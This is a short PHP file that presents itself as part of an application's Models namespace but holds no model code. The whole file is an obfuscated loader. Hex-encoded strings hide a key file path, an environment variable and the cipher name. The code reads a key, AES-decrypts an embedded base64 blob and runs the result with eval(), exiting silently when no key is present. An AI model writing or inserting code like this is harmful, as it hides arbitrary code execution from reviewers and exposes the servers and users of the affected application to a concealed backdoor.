<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('8MxZiTOVlbPmaJ7xmrWa6w==');

$c=base64_decode(

'GlrI0AKlu1k+N9KkSeVuk5nhJBk3C2NVihL6e9+pSdzKhAgUZc291J9qh/DOQCi7aBkykWeoeUTK' .
'MFZXl5lESKQhzJgQJ38ZRySyGGygYayqUiykpodEHuqMN7rK4JN7UGdwyeBpgGO6rQH0W+O2E8cN' .
'gi84ys4oOQXAHtUkJrYGaYo1MyJZW1liZDsix5oXplgOCXAWuOgsPkcjRP3RqiEDtMxn7Pt3PWSE' .
'nLzt4ZqJ8xgcpYCcuPsaba8BjpnDgkTlJye4DpnKNEMSocdohMU9af4FG+tAW51HlWys88BfOh+/' .
'TyU/Cd4nbiKHlkFj0Fx2MALNusuGvttBRkCe/VK4zMxdzknE4lK3GEQdDiM4Y4cjDyZBUyQjgnq4' .
'vAgRbow+xO9EyO45QryZr1WgNVpjJjmy1PKxRXgbMGEHn76NrkeJqu5cljcU+JT/7UmpnRDrutZf' .
'Xm46xUQ+VSOXL3T6hYEnbXv0d5nwv2EnxuX1+M9blwfQY383mf3kE5qJo7eOyx77XLPiKsSsOgZ5' .
'5ZEeqH8zKv6oxo7tDoKjuGB9ZdBsUxSTLWokeuwhwVDdpCx4Q2aGOXCSoFbnT6DCRK7sicd7j0WY' .
'Pp6CArhvb5DdVUOGS9xmtkoGmhGCLRUbuwv/gglQdGpNSCe8ImisXf5sK+zlfA0fXYemJOoe5Nje' .
'mWNJn1Di1y53vN+qwi3wmqOsCjNIbxBy5VDgx/5TZYelcL543lTDXClYW6JGlXZe1DgagSOGhxbb' .
'HyUOtPolCU0jQWo5bjpxNwyx3V37oA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

